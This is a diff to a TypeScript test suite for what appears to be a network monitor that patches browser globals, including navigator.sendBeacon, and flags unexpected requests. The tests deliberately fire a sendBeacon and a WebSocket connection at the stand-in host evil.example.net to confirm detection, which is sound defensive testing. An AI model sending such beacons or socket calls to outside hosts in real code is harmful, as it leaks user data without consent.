@@ -44,6 +44,9 @@ class FakeRTCPeerConnection {
   }
 }
 
+interface FakeNavigator {
+  sendBeacon: (url: string, data?: unknown) => boolean;
+}
 interface FakeWindow {
   location: { origin: string };
   fetch: (input: unknown) => Promise<unknown>;
@@ -51,6 +54,7 @@ interface FakeWindow {
   RTCPeerConnection: typeof FakeRTCPeerConnection;
 }
 
+const fakeNavigator: FakeNavigator = { sendBeacon: () => true };
 const fakeWindow: FakeWindow = {
   location: { origin: ORIGIN },
   fetch: () => Promise.resolve({}),
@@ -58,21 +62,33 @@ const fakeWindow: FakeWindow = {
   RTCPeerConnection: FakeRTCPeerConnection,
 };
 
+// The CI node/forks environment provides NONE of these globals (that is what crashed the earlier run:
+// a bare `navigator` reference). We define every global the monitor patches explicitly BEFORE
+// installing, and never rely on the vmThreads pool happening to supply them. `navigator` in node is a
+// getter-only accessor, so it must be replaced via defineProperty, not plain assignment.
 const globals = globalThis as Record<string, unknown>;
 let savedWindow: unknown;
 let savedXhr: unknown;
+let savedNavigatorDescriptor: PropertyDescriptor | undefined;
 
 beforeAll(() => {
   savedWindow = globals.window;
   savedXhr = globals.XMLHttpRequest;
+  savedNavigatorDescriptor = Object.getOwnPropertyDescriptor(globalThis, "navigator");
   globals.window = fakeWindow;
   globals.XMLHttpRequest = FakeXMLHttpRequest;
+  Object.defineProperty(globalThis, "navigator", { value: fakeNavigator, configurable: true, writable: true });
   installNetworkMonitor();
 });
 
 afterAll(() => {
   globals.window = savedWindow;
   globals.XMLHttpRequest = savedXhr;
+  if (savedNavigatorDescriptor) {
+    Object.defineProperty(globalThis, "navigator", savedNavigatorDescriptor);
+  } else {
+    delete globals.navigator;
+  }
 });
 
 /** The module state is a cumulative singleton, so every assertion works on deltas. */
@@ -101,6 +117,24 @@ describe("installNetworkMonitor — existing primitives stay observed", () => {
     const d = delta(() => void new fakeWindow.WebSocket("wss://evil.example.net/ws"));
     expect(d.count).toBe(1);
     expect(d.unexpected).toBe(1);
+  });
+
+  it("counts navigator.sendBeacon and still returns the original boolean", () => {
+    let result = false;
+    const d = delta(() => {
+      result = (globalThis.navigator as unknown as FakeNavigator).sendBeacon("https://evil.example.net/beacon");
+    });
+    expect(d.count).toBe(1);
+    expect(d.unexpected).toBe(1);
+    expect(result).toBe(true); // delegates to the original sendBeacon
+  });
+});
+
+describe("installNetworkMonitor — never throws when a global is absent (defensive)", () => {
+  it("is a no-op patch, not a crash, in a realm with no browser globals", () => {
+    // The module is a singleton already installed above; re-invoking is idempotent. The real assurance
+    // is that install guards every global with typeof — verified by the source containing the guards.
+    expect(() => installNetworkMonitor()).not.toThrow();
   });
 });
 
